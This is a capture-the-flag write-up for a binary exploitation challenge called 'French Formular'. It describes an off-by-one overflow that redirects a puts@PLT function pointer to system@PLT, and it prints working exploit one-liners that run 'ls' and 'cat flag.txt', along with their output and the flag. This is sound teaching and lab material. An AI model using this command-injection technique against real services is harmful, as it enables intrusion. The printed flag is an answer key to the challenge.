# FRENCH FORMULAR
## <u>**CatÃ©gorie**</u>

PWN

## <u>**Description**</u> :

I am trying to get a French nationality but their administration service looks shitty...
Could you please help me to get an ID Card via their formular ? 

FORMAT DU FLAG : Fichier `flag.txt` à lire en remote, MCTF{...}

ACCES AU CHALLENGE :

Une instance remote devra être déployée, les joueurs auront accès au binaire pour l'étudier et l'exploiter en local s'ils le souhaitent.
Les joueurs devront exploiter le service en remote pour pouvoir lire le fichier flag.txt

Binaire fourni

## <u>Hints</u> 

According to an advisor I spoke with, the issue might be somehow related to the "Procedure Linkage Table"...
But I don't understand what this means !

## <u>Auteur</u> 

Noiche

## <u>Solution</u> :

Lorsque l'on exécute le programme, on se rend compte qu'il affiche la date et demande une entrée à l'utilisateur.

En utilisant ltrace par exemple, on constate que le programme utilise la fonction "system" de la libc.
Cela implique qu'une entrée pour la fonction "system" sera présente dans la PLT.

Si l'on envoit une input trop grande, le programme peut crash, et on s'aperçoit qu'on contrôle le dernier byte du pointeur de fonction qui est utilisé pour call puts().
--> Cause du crash : l'entrée user est récupérée via read() dans un buffer située dans la section .data du binaire, avec un off-by-one
--> Juste après ce buffer, dans la même section, on trouve un pointeur de fonction qui pointe sur puts@PLT et qui est utilisé pour call puts dans le code source, avec comme argument le buffer cité précédemment.
--> L'idée étant qu'en condition normale, pFunc(buffer) soit équivalent à puts(buffer) et affiche donc à l'écran le nom indiqué par l'utilisateur
--> Il est donc possible de réécrire le pointeur de fonction et de le faire pointer vers system@PLT, qui a l'avantage d'avoir le même prototype que puts.
--> Le résultat : la fonction system sera appelée et le buffer utilisé comme argument
--> Il suffit donc de mettre une commande bash (ls, cat...) au début du buffer, suivi par exemple de " # ", combler avec du padding ("A" par exemple) et réécrire le pointeur de fonction

Exemple :

```bash
 kali@kali  ~/Documents/SB/MCTF/PWN/chall_3  python3 -c "print('ls #' + 'A'*(256-4) + '\x40')" | ./French_Formular
Tue Apr  5 03:15:27 PM CEST 2022

[...]

 Let's begin with something simple. What is your name ? :


 Here is what you typed :

flag.txt  French_Formular  French_Formular.c  WU.md

 Sorry, you can't go further because our service is not available due to a technical issue, try again later...

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_3  python3 -c "print('cat flag.txt #' + 'A'*(256-14) + '\x40')" | ./French_Formular
Tue Apr  5 03:15:50 PM CEST 2022

[...]

 Let's begin with something simple. What is your name ? :


 Here is what you typed :

MCTF{Your_ID_Card_Number_Is_6950364305038_!!}

 Sorry, you can't go further because our service is not available due to a technical issue, try again later...

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_3  
```

##**Flag : MCTF{Your_ID_Card_Number_Is_6950364305038_!!}**
